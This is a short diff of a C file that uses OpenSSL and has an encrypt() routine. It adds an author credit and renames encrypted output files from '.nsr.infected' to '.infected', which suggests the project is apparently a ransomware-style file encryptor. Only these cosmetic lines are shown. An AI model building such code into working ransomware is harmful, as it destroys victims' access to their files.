@@ -1,4 +1,9 @@
-﻿#include <stdio.h>
+/*
+    *
+    * @author : MINIBEEF@github.com
+    *
+*/
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <openssl/pem.h>
@@ -120,7 +125,7 @@ void encrypt(char* file)
         exit(-1);
     }
 
-    strcat(origin_file, ".nsr.infected");
+    strcat(origin_file, ".infected");
     FILE* create_fp = fopen(origin_file, "wb"); // enc
 
     int ch; // file char
